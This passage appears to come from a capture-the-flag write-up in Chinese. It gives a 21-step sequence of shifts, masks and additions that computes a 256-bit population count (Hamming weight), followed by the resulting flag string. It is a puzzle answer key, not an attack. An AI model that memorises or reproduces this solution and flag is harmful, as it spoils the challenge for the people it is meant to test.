A = A & 6811299366900952671974763824040465167839410862684739061144563765171360567055;
B = A >> 8;
A = A + B;
B = A >> 16;
A = A + B;
B = A >> 32;
A = A + B;
B = A >> 64;
A = A + B;
A = A & 127;
```

输入以下这段即可得到flag

```bash
B=A>>1;B=B&38597363079105398474523661669562635951089994888546854679819194669304376546645;A=A-B;B=A&23158417847463239084714197001737581570653996933128112807891516801582625927987;A=A>>2;A=A&23158417847463239084714197001737581570653996933128112807891516801582625927987;A=A+B;B=A>>4;A=A+B;A=A&6811299366900952671974763824040465167839410862684739061144563765171360567055;B=A>>8;A=A+B;B=A>>16;A=A+B;B=A>>32;A=A+B;B=A>>64;A=A+B;A=A&127;
flag{you_can_weight_it_in_21_steps!}
```